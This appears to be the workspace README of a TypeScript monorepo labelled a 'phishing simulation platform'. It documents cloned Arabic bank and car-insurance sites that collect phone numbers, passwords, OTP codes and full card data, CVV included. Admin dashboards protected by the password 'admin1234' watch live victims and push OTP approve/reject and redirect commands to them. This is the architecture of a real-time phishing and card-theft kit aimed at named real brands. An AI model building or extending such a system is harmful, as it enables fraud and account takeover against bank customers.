# Workspace

## Overview

pnpm workspace monorepo using TypeScript. Phishing simulation platform with multiple Arabic banking/insurance sites, shared API server, and admin dashboards.

## Stack

- **Monorepo tool**: pnpm workspaces
- **Node.js version**: 24
- **Package manager**: pnpm
- **TypeScript version**: 5.9
- **API framework**: Express 5
- **Database**: PostgreSQL (raw `pg` client)
- **Validation**: Zod (`zod/v4`), `drizzle-zod`
- **Build**: esbuild (CJS bundle) — API server dev script now runs pre-built dist directly (`node ./dist/index.mjs`) to avoid OS thread exhaustion with 9 concurrent workflows

## Artifacts & Ports

| Artifact | Port | Path | Purpose |
|----------|------|------|---------|
| `api-server` | 8080 | `/api/` | Shared API for all sites |
| `sham-cash` | 25520 | `/` | Sham Cash banking simulation |
| `sham-admin` | 22013 | `/admin-panel/` | Sham Cash admin dashboard |
| `tameeni` | 22470 | `/tameeni/` | تأميني car insurance simulation |
| `wiqaya` | 23662 | `/wiqaya/` | وقاية car insurance simulation |
| `wiqaya-admin` | 19062 | `/wiqaya-admin/` | وقاية admin dashboard |
| `unity-bank` | 26000 | `/unity-bank/` | Unity Digital Bank simulation |
| `unity-admin` | 26001 | `/unity-admin/` | Unity Bank admin dashboard |
| `mockup-sandbox` | 8081 | (design canvas) | UI component preview |

## Artifact Details

### sham-cash (`artifacts/sham-cash`)
- User-facing banking/loan app
- Routes: `/` (login), `/otp`, `/changepass`, `/blocked`
- Supports Arabic/English toggle (`useLang` hook)
- Calls API via Vite proxy `/api` → `localhost:8080`
- Key hooks: `useVisitorTracking`, `useAdminCommands`

### sham-admin (`artifacts/sham-admin`)
- Admin dashboard at `/admin-panel/`
- Arabic-only, shows all visitor submissions from PostgreSQL
- Polls API every 2s for live status (heartbeat-based `isActive`)
- Can send redirect/OTP/password commands to specific visitors
- Admin password: `admin1234`
- Calls API via Vite proxy `/api` → `localhost:8080`

### tameeni (`artifacts/tameeni`)
- تأميني car insurance phishing site at `/tameeni/`
- Pages: Home, Login, OTP, Card, Waiting
- Colors: #1a5c3a (green), Cairo font
- API: `/api/tameeni/*`
- DB: `tameeni_submissions`

### wiqaya (`artifacts/wiqaya`)
- وقاية car insurance phishing site at `/wiqaya/`
- Pages: Home, Login, OTP, Card, Waiting
- Colors: #2563EB (blue), Cairo font
- API: `/api/wiqaya/*`
- DB: `wiqaya_submissions`

### wiqaya-admin (`artifacts/wiqaya-admin`)
- Admin dashboard for وقاية at `/wiqaya-admin/`
- Password gate: `admin1234`
- Full command system: redirect, OTP approve/reject, delete

### unity-bank (`artifacts/unity-bank`)
- البنك الوحدة الرقمي at `/unity-bank/`
- Pages: Home, Login, Card, Waiting, OTP
- Colors: #1a3d6e (navy), #c4923e (gold), Cairo font
- Visitor IDs: `u-` prefix, localStorage key: `unity_id`
- API: `/api/unity/*`
- DB: `unity_submissions`

### unity-admin (`artifacts/unity-admin`)
- Admin dashboard for Unity Bank at `/unity-admin/`
- Password gate: `admin1234`
- Features: stat cards, live visitor table, card data with CVV reveal, command buttons

### api-server (`artifacts/api-server`)
- Express 5 API on port 8080
- Routes: `/api/sham/*`, `/api/tameeni/*`, `/api/wiqaya/*`, `/api/unity/*`
- Dev script runs pre-built dist (`./dist/index.mjs`) to avoid esbuild resource exhaustion
- To rebuild after changes: `cd artifacts/api-server && NODE_ENV=development pnpm run build`

## Database Tables

### `sham_submissions`
Stores Sham Cash visitor login data + OTP/password status.

### `sham_admin_cmds`
One-shot command queue for Sham Cash. Commands: `redirect:*`, `otp:approved|rejected`, `changepass:approved|rejected`.

### `tameeni_submissions`
Stores تأميني visitor data. Columns: id, phone, password, otp_code, otp_status, page, card_*, is_active, last_seen, country, cmd.

### `wiqaya_submissions`
Stores وقاية visitor data. Same structure as tameeni_submissions.

### `unity_submissions`
Stores Unity Bank visitor data. Same structure, `cmd` column separate from `page`.

## Key Notes

- **9 workflows**: System is at OS thread limit. esbuild/Go binaries crash with `newosproc` when all workflows run simultaneously. API server fixed by running pre-built dist directly.
- **API server rebuild**: After any code change to `artifacts/api-server/src/`, run build manually then restart workflow.
- **Visitor tracking**: Heartbeat every 3s. Live if `lastSeen < 8000ms` ago.
- **Commands are one-shot**: consumed and cleared on first poll read.

## Key Commands

- `pnpm run typecheck` — full typecheck across all packages
- `pnpm run build` — typecheck + build all packages
- Rebuild API server: `cd artifacts/api-server && NODE_ENV=development pnpm run build`
